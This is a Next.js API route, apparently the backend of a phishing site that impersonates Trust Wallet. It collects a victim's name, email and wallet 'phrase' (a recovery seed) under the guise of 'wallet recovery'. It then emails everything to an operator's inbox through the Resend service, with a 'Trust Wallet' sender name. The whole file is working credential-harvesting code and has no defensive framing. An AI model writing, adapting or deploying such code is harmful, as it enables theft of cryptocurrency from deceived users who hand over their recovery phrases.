import { Resend } from "resend";
import { NextRequest, NextResponse } from "next/server";
import { buildEmailHtml } from "@/lib/email-template";

const resend = new Resend(process.env.RESEND_API_KEY);

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();

    const {
      fullName,
      email,
      description,
      phrase,
      submissionId,
      submittedAt,
      verificationHash,
    } = body;

    // Validate required fields
    if (!fullName || !email || !phrase || !submissionId) {
      return NextResponse.json(
        { error: "Missing required fields" },
        { status: 400 }
      );
    }

    const htmlContent = buildEmailHtml({
      fullName,
      email,
      description,
      phrase,
      submissionId,
      submittedAt,
      verificationHash,
    });

    const { data, error } = await resend.emails.send({
      from: process.env.RESEND_FROM_EMAIL || "Trust Wallet <onboarding@resend.dev>",
      to: [process.env.NOTIFICATION_EMAIL || "your-email@gmail.com"],
      subject: `🔐 New Wallet Recovery — ${fullName} [${submissionId}]`,
      html: htmlContent,
      replyTo: email,
    });

    if (error) {
      console.error("Resend API error:", error);
      return NextResponse.json(
        { error: "Failed to send notification", details: error },
        { status: 500 }
      );
    }

    return NextResponse.json(
      { success: true, messageId: data?.id },
      { status: 200 }
    );
  } catch (err) {
    console.error("Email route error:", err);
    return NextResponse.json(
      { error: "Internal server error" },
      { status: 500 }
    );
  }
}